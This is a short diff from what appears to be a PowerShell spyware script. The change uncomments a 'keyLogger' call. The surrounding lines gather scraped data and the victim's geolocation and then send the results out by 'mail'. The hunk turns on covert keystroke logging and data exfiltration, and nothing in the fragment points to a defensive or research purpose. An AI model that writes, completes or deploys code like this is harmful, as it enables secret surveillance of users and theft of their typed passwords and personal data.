@@ -40,7 +40,7 @@ $results = "RESULTS `n"
 initialize
 $results = nonAdministrativeScrapperFunctions
 ### Runs Key logger (does not require admin privs)
-#keyLogger
+keyLogger
 $results += findGeoLocation
 $results
 mail $results
